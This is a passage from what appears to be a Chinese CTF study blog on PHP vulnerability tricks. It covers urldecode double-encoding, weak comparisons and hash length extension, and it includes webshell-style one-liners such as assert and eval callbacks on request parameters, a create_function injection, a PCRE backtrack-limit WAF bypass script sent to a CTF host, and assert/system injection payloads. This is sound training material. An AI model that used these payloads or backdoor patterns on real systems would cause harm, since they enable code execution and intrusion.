<li>使用圆括号 <code>()</code> 创建捕获组，捕获组中的内容会被捕获到 <code>matches</code> 数组中。</li>
<li>示例：<code>/(hello) (world)/</code> 匹配 “hello world”，<code>matches[1]</code> 会是 “hello”，<code>matches[2]</code> 会是 “world”。</li>
</ul>
</li>
<li><strong>选择符 <code>|</code></strong>:<ul>
<li>用于匹配多个模式中的一个。</li>
<li>示例：<code>/cat|dog/</code> 匹配 “cat” 或 “dog”。</li>
</ul>
</li>
<li><strong>锚点</strong>:<ul>
<li><code>^</code> 匹配字符串的开头。</li>
<li><code>$</code> 匹配字符串的结尾。</li>
<li>示例：<code>/^hello/</code> 匹配 “hello” 仅当它出现在字符串的开头。</li>
<li><code>hello$/</code> 匹配 “hello” 仅当它出现在字符串的结尾。</li>
</ul>
</li>
<li><strong>零宽断言</strong>:<ul>
<li><strong>肯定先行断言</strong> <code>(?=...)</code>：匹配条件前面的位置，但不消耗字符。</li>
<li><strong>否定先行断言</strong> <code>(?!...)</code>：匹配条件前面的位置，并且不允许后面有特定内容。</li>
<li><strong>肯定后行断言</strong> <code>(?&lt;=...)</code>：匹配条件后面的位置。</li>
<li><strong>否定后行断言</strong> <code>(?&lt;!...)</code>：匹配条件后面的位置，但不允许前面有特定内容。</li>
</ul>
</li>
<li><strong>转义字符</strong>：<code>\</code> 用于转义字符，使其具有特殊含义。例如 <code>\d</code> 匹配任何数字，<code>\w</code> 匹配任何单词字符。</li>
<li><strong><code>(?R)?</code></strong>: 可选的递归匹配，用于处理嵌套函数调用。<code>?</code> 使得它变成可选的，以便处理最内层没有嵌套的函数调用。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="11-urldecode-string-str-string"><a href="#11-urldecode-string-str-string" class="headerlink" title="(11) urldecode ( string $str ) : string"></a>(11) <code>urldecode ( string $str ) : string</code></h2><ul>
<li>解码已编码的 URL 字符串，因为发送请求的时候浏览器会自动进行一次解码，如果在代码中又执行 <code>urldecode</code> 就可能会存在绕过。例如：发送 <code>?id = 1%2527--》php接收到为$id=1%27</code> 如果在执行 <code>$id=urldecode($id)</code> ，最终 <code>$id=1&#39;</code></li>
</ul>
<h2 id="12-回调函数"><a href="#12-回调函数" class="headerlink" title="(12) 回调函数"></a>(12) 回调函数</h2><ul>
<li><p>回调函数是将一个函数作为参数传入另一个函数。由于可以将函数作为参数传入执行，将一些危险的函数作为参数传入，可能成为一个不易检测的后门。在 PHP 中有常用的回调函数：<code>call_user_func</code>、<code>call_user_func_array</code>、<code>array_map</code> 等。</p>
</li>
<li><p>例如：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;assert&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&quot;pass&quot;</span>]);</span><br></pre></td></tr></table></figure>
<p><code>assert()</code> 函数直接作为回调函数，以 <code>$_REQUEST[&quot;pass&quot;]</code> 作为 <code>assert</code> 参数调用。</p>
</li>
</ul>
<h2 id="14-比较漏洞-hash-长度扩展攻击"><a href="#14-比较漏洞-hash-长度扩展攻击" class="headerlink" title="(14) 比较漏洞 - hash 长度扩展攻击"></a>(14) 比较漏洞 - hash 长度扩展攻击</h2><p>工具利用：HashPump&#x2F;Hexpand&#x2F;hash_extender</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 setup.py install  <span class="comment"># 安装Python绑定</span></span><br><span class="line">hashpump -h </span><br></pre></td></tr></table></figure>

<p><strong>HashPump安装</strong>：</p>
<ol>
<li><code>git clone https://github.com/bwall/HashPump.git</code></li>
<li><code>apt-get install g++ libssl-dev</code></li>
<li><code>cd HashPump</code></li>
<li><code>make &amp;&amp; make install</code></li>
</ol>
<p><strong>利用条件</strong>：</p>
<ol>
<li>使用 <code>hash(key || message)</code> 这种方式，且使用了 MD5 或 SHA-1 等基于 Merkle–Damgård 构造的哈希函数生成哈希值；</li>
<li>让攻击者可以提交数据以及哈希值，虽然攻击者不知道密钥；</li>
<li>服务器把提交的数据跟密钥构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值。</li>
</ol>
<p><strong>扩展</strong>：</p>
<ul>
<li>若长度未知，可进行爆破，参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq1045553189/article/details/87566846">https://blog.csdn.net/qq1045553189/article/details/87566846</a></li>
</ul>
<h2 id="15-array-search"><a href="#15-array-search" class="headerlink" title="(15) array_search"></a>(15) <code>array_search</code></h2><ul>
<li>是弱类型比较，这意味着在某些情况下，PHP 会将字符串与数字进行比较时转换为相同的类型。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br></pre></td></tr></table></figure>

<ul>
<li>PHP 会把 <code>DGGJ</code> 转为 <code>0</code>，<code>d === false ? die(&quot;no...&quot;) : NULL;</code>，此时查找的就是 <code>0</code> 在数组里的位置了。我们可以把 <code>0</code> 放在索引为 <code>1</code> 的地方，这样 <code>1 === false</code> 不成立。</li>
</ul>
<h2 id="16-create-function"><a href="#16-create-function" class="headerlink" title="(16) create_function"></a>(16) <code>create_function</code></h2><ul>
<li>代码注入</li>
<li>从 PHP 7.2.0 开始被标记为已弃用，并在 PHP 8.0.0 中被移除。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$newfunc</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="string">&#x27;return $a+$b;&#x27;</span>);</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">newfunc</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span> + <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$newfunc</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#125;eval($_POST[&quot;cmd&quot;]);//&#x27;</span>);</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">newfunc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="17-通过构造动态调用函数"><a href="#17-通过构造动态调用函数" class="headerlink" title="(17) 通过构造动态调用函数"></a>(17) 通过构造动态调用函数</h2><ul>
<li>例子：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pi</span> = <span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));(<span class="variable">$$pi</span>)&#123;pi&#125;((<span class="variable">$$pi</span>)&#123;abs&#125;)</span><br></pre></td></tr></table></figure></li>
<li>分析：<ul>
<li><code>$pi = hex2bin(&quot;5f474554&quot;) =&gt; _GET</code></li>
<li>$$pi 取出真正的 <code>_GET</code> 数组，$p 得到的 <code>_GET</code> 只是字符串；因为 <code>[]</code> 被禁了就用 <code>&#123;&#125;</code> 代替，最后的得：</li>
<li><code>(_GET)&#123;pi&#125;((_GET)&#123;abs&#125;)</code></li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$text</span>) &amp;&amp; <span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>) &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>) === <span class="string">&quot;I have a dream&quot;</span>) &#123;</span><br></pre></td></tr></table></figure>

<h2 id="18-使用-file-get-contents-file"><a href="#18-使用-file-get-contents-file" class="headerlink" title="(18) 使用  file_get_contents($file)"></a>(18) 使用  file_get_contents($file)</h2><ul>
<li>用 &#96;file_get</li>
</ul>
<p>_contents(‘php:&#x2F;&#x2F;input’)<code>来读取原始</code>POST<code>数据，而不是</code>$_POST&#96; 键值对。</p>
<p>  例如，如果你发送的是 <code>debu=aqua_is_cute&amp;file=data://text/plain,debu_debu_aqua&amp;shana[]=1&amp;passwd[]=2</code>，则 <code>php://input</code> 会读取整个 <code>debu=aqua_is_cute&amp;file=data://text/plain,debu_debu_aqua&amp;shana[]=1&amp;passwd[]=2</code> 作为字符串。</p>
<h2 id="19-pcre-回溯"><a href="#19-pcre-回溯" class="headerlink" title="(19) pcre 回溯"></a>(19) <code>pcre</code> 回溯</h2><ul>
<li>假设要匹配的正则是 <code>&lt;\?.\*[(</code>;?&gt;].*<code>，输入是 </code>&lt;?php phpinfo();&#x2F;&#x2F;aaaaa&#96;。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;\?.\*[(`;<span class="meta">?&gt;</span>].\*&lt;Br&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="comment">//aaaaa</span></span><br></pre></td></tr></table></figure>
<ul>
<li>正则的 <code>&lt;</code> 匹配了输入的 <code>&lt;</code>。当前匹配成功则读取下一个字符。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;\?.\*[(`;<span class="meta">?&gt;</span>].\*&lt;br&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="comment">//aaaaa</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>?</code> 也匹配成功，继续。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;\?.\*[(`;<span class="meta">?&gt;</span>].\*&lt;br&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="comment">//aaaaa</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>.*</code> 会匹配完接下来的所有字符，目前是没什么问题，但是读取下一个正则时就出问题了。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;\?.\*[(`;<span class="meta">?&gt;</span>].\*&lt;br&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="comment">//aaaaa</span></span><br></pre></td></tr></table></figure>
<ul>
<li>发现输入已经没东西匹配了。此时 NFA 开始回溯，回退之前匹配的字符。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;\?.\*[(`;<span class="meta">?&gt;</span>].\*&lt;br&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="comment">//aaaa</span></span><br></pre></td></tr></table></figure>
<ul>
<li>回退出来的字符 <code>a</code> 仍然无法匹配 <code>[(</code>;?&gt;]&#96;。继续回溯。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;\?.\*[(`;<span class="meta">?&gt;</span>].\*&lt;br&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="comment">//aaa</span></span><br></pre></td></tr></table></figure>
<ul>
<li>回溯这一步骤会重复执行，直到回溯到下面的状态。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;\?.\*[(`;<span class="meta">?&gt;</span>].\*&lt;br&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>()</span><br></pre></td></tr></table></figure>
<ul>
<li>这一步回溯回退出来的字符是 <code>;</code>，匹配正则表达式 <code>[(</code>;?&gt;]&#96;。便停止回溯，匹配上字符。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;\?.\*[(`;<span class="meta">?&gt;</span>].\*&lt;br&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure>
<ul>
<li>最后的一个正则表达式匹配完接下来的所有内容。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;\?.\*[(`;<span class="meta">?&gt;</span>].\*&lt;br&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="comment">//aaaaa</span></span><br></pre></td></tr></table></figure>
<ul>
<li>完全匹配成功，返回 <code>true</code>。如果我们数一下，会发现回溯次数为 <code>8</code>，而回溯次数是有上限的，默认是 <code>100</code> 万。如果输入字符串执行正则时回溯次数超过了这个上限，就会返回 <code>false</code>。但这个 <code>false</code> 可以被强制转换。</li>
</ul>
<p>例如下面的 WAF：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$input</span> = <span class="string">&quot;SELECT * FROM users WHERE id = 1 UNION &quot;</span> . <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;/*!A*/ &quot;</span>, <span class="number">10000</span>) . <span class="string">&quot;SELECT name, email FROM users;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/UNION.+?SELECT/is&#x27;</span>, <span class="variable">$input</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;SQL Injection&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No SQL Injection detected.&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>可以利用 <code>pcre</code> 的回溯次数限制绕过。</li>
</ul>
<p>但是下面的 WAF：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="variable">$data</span>);  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_php</span>(<span class="variable">$input</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// fwrite($f, $input); ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>使用了 <code>===</code> 强等于，<code>PREG_BACKTRACK_LIMIT_ERROR</code> 不等于 <code>0</code>。利用这一特点，我们可以在 <code>payload</code> 末尾加一堆 <code>a</code>，使其超过回溯限制。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="string">&quot;a&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">res = requests.post(<span class="string">&quot;http://4610db05-7adf-404b-8c30-b1047f5c5703.node4.buuoj.cn:81/&quot;</span>, data=&#123;<span class="string">&quot;cmd&quot;</span>:payload&#125;)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<h2 id="20-json-decode-json-true-cmd"><a href="#20-json-decode-json-true-cmd" class="headerlink" title="(20) json_decode($json, true)[&#39;cmd&#39;];"></a>(20) <code>json_decode($json, true)[&#39;cmd&#39;];</code></h2><ul>
<li><code>json_decode()</code> 是一个用于将 JSON 格式的字符串转换为 PHP 数据结构（数组或对象）的函数。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$json</span> = <span class="string">&#x27;&#123;&quot;cmd&quot;: &quot;echo hello&quot;, &quot;user&quot;: &quot;admin&quot;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>json_decode($json, true)</code> 将 JSON 字符串解析为 PHP 关联数组：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$array</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="comment">// $array 现在等于：[&quot;cmd&quot; =&gt; &quot;echo hello&quot;, &quot;user&quot; =&gt; &quot;admin&quot;]</span></span><br><span class="line"><span class="variable">$command</span> = <span class="variable">$array</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="comment">// $command 现在等于 &quot;echo hello&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><p><code>json_decode($json, false)</code> 将 JSON 字符串解析为一个 PHP 对象：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$object</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$json</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="comment">// $object 现在是一个对象，其属性如下：</span></span><br><span class="line"><span class="comment">// $object-&gt;cmd = &quot;echo hello&quot;</span></span><br><span class="line"><span class="comment">// $object-&gt;user = &quot;admin&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="21-assert-注入"><a href="#21-assert-注入" class="headerlink" title="(21) assert 注入"></a>(21) <code>assert</code> 注入</h2><ul>
<li><code>assert(&quot;intval($_GET[num])==1919810&quot;)</code></li>
<li><code>assert</code> 里面直接把我们的输入拼接进去了 <code>?num=114514)==114514;//</code></li>
</ul>
<h2 id="22-strstr"><a href="#22-strstr" class="headerlink" title="(22) strstr()"></a>(22) <code>strstr()</code></h2><ul>
<li><p>搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 <code>FALSE</code>。</p>
</li>
<li><p>语法：<code>strstr(string, search, before_search)</code></p>
</li>
<li><p><code>string</code>: 必需。规定被搜索的字符串。</p>
</li>
<li><p><code>search</code>: 必需。规定要搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。</p>
</li>
<li><p><code>before_search</code>: 可选。一个默认值为 <code>false</code> 的布尔值。如果设置为 <code>true</code>，它将返回 <code>search</code> 参数第一次出现之前的字符串部分。</p>
</li>
<li><p>注意这个函数是大小写敏感的。这里可以用 <code>PHP://</code> 绕过，也可以考虑另外一个 PHP 伪协议：<code>data://</code></p>
</li>
</ul>
<h2 id="23-mb-substr"><a href="#23-mb-substr" class="headerlink" title="(23) mb_substr()"></a>(23) <code>mb_substr()</code></h2><ul>
<li><p>返回字符串的一部分，中文字符也可以使用。<code>substr()</code> 只针对英文字符</p>
</li>
<li><p>语法：<code>mb_substr(字符串, 起始, 长度, 编码)</code>，其中长度和编码可选。</p>
</li>
<li><p>将土耳其语中的 “İstanbul” 转换为小写时，可能输出带点的 “i”（”i̇stanbul”）</p>
</li>
</ul>
<h2 id="24-mb-strpos"><a href="#24-mb-strpos" class="headerlink" title="(24) mb_strpos()"></a>(24) <code>mb_strpos()</code></h2><ul>
<li><p>返回要查找的字符串在别一个字符串中首次出现的位置</p>
</li>
<li><p>语法：<code>mb_strpos (字符串, 要搜索的字符串)</code></p>
</li>
<li><p>因为 <code>mb_strpos()</code> 只会返回首次出现的位置，所以如果我们传类似于 <code>hint.php?想要查看的文件路径</code> 这样的 <code>payload</code> 的话，切割的结果是 <code>hint.php</code>，通过了过滤。问题是过滤通过了后这个 <code>payload</code> 根本就不是一个有效的文件名。</p>
</li>
<li><p>不急，<code>include</code> 有一个很有趣的特性：</p>
<ul>
<li>如果参数中包含 <code>../</code> 这样的路径，解析器则会忽略 <code>../</code> 之前的字符串而去在当前目录的父目录下寻找文件。</li>
<li>这意味着我们只要在想要查看的文件路径中使用 <code>../</code> 这类路径，<code>include</code> 就会自动忽略前面的内容，这样真正包含的文件名就是有效的了。一点一点试就可以得到正确的路径了。</li>
</ul>
</li>
</ul>
<h2 id="24-文件存在"><a href="#24-文件存在" class="headerlink" title="(24) 文件存在"></a>(24) 文件存在</h2><ul>
<li><p><code>file_exists()</code> 返回布尔值：</p>
<ul>
<li>如果文件存在，则返回 <code>TRUE</code></li>
<li>如果文件不存在，则返回 <code>FALSE</code></li>
</ul>
<p>与其他相关函数不同的是：</p>
<ul>
<li><code>is_file($filename)</code> 仅检查文件是否存在，并且必须是一个文件，而不是目录。</li>
<li><code>is_dir($filename)</code> 检查是否存在一个目录，哪怕它是空的。</li>
</ul>
</li>
</ul>
<h2 id="25-strpos"><a href="#25-strpos" class="headerlink" title="(25) strpos"></a>(25) <code>strpos</code></h2><ul>
<li>查找字符串在另一字符串中第一次出现的位置（区分大小写），如果没有找到字符串则返回 <code>FALSE</code>。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">templates/<span class="string">&#x27;.system(&#x27;</span>cat+./templates/flag.php<span class="string">&#x27;).&#x27;</span>.php</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;templates/&#x27;.system(&#x27;cat+./templates/flag.php&#x27;).&#x27;.php&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="逻辑漏洞绕过"><a href="#逻辑漏洞绕过" class="headerlink" title="逻辑漏洞绕过"></a>逻辑漏洞绕过</h2><ul>
<li>源码如下：</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span>=<span class="number">0</span>;<span class="variable">$v2</span>=<span class="number">0</span>;<span class="variable">$v3</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$a</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;foo&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">   <span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$a</span>[<span class="string">&quot;bar1&quot;</span>])?<span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">   <span class="keyword">if</span>(@<span class="variable">$a</span>[<span class="string">&quot;bar1&quot;</span>])&#123;</span><br><span class="line">       (<span class="variable">$a</span>[<span class="string">&quot;bar1&quot;</span>]&gt;<span class="number">2021</span>)?<span class="variable">$v1</span>=<span class="number">1</span>:<span class="literal">NULL</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>]))&#123;</span><br><span class="line">       <span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>])!==</span><br><span class="line"></span><br><span class="line"><span class="number">5</span> OR !<span class="title function_ invoke__">is_array</span>(<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">       <span class="variable">$pos</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;me7e&quot;</span>, <span class="variable">$a</span>[<span class="string">&quot;a2&quot;</span>]);</span><br><span class="line">       <span class="variable">$pos</span>===<span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">       <span class="keyword">foreach</span>(<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">           <span class="variable">$val</span>===<span class="string">&quot;me7e&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="variable">$v2</span>=<span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;cat&#x27;</span>];</span><br><span class="line"><span class="variable">$d</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;dog&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(@<span class="variable">$c</span>[<span class="number">1</span>])&#123;</span><br><span class="line">   <span class="keyword">if</span>(!<span class="title function_ invoke__">strcmp</span>(<span class="variable">$c</span>[<span class="number">1</span>],<span class="variable">$d</span>) &amp;&amp; <span class="variable">$c</span>[<span class="number">1</span>]!==<span class="variable">$d</span>)&#123;</span><br><span class="line">       <span class="title function_ invoke__">eregi</span>(<span class="string">&quot;3|1|c&quot;</span>,<span class="variable">$d</span>.<span class="variable">$c</span>[<span class="number">0</span>])?<span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">       <span class="title function_ invoke__">strpos</span>((<span class="variable">$c</span>[<span class="number">0</span>].<span class="variable">$d</span>), <span class="string">&quot;me7e2021&quot;</span>)?<span class="variable">$v3</span>=<span class="number">1</span>:<span class="literal">NULL</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v1</span> &amp;&amp; <span class="variable">$v2</span> &amp;&amp; <span class="variable">$v3</span>)</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$flag13</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>第一层</strong>： 需要传入一个不是数字但是大于 2021 的参数，根据弱比较可以让 <code>bar1=2022asd</code></p>
</li>
<li><p><strong>第二层</strong>: <code>bar2</code> 有 5 个元素，并且第一个是数组，让 <code>bar2=[[0],2,3,4,5]</code>，通过弱比较绕过 <code>array_search</code> 的搜索 </p>
</li>
<li><p><strong>第三层</strong>：因为是 PHP5，且 <code>eregi</code> 存在 <code>00</code> 截断可以直接绕过</p>
</li>
